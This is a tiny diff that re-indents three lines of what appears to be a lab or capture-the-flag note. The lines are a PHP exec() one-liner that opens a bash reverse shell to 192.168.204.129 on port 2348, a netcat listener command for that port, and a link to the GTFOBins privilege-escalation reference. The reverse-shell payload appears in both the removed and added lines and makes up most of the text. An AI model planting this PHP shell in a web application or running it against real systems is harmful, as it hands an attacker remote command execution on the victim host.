@@ -1,6 +1,6 @@
-<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.204.129/2348 0>&1'"); ?>
+    <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.204.129/2348 0>&1'"); ?>
 
-sudo nc -lvnp 2348
+    sudo nc -lvnp 2348
 
 https://gtfobins.github.io/
 
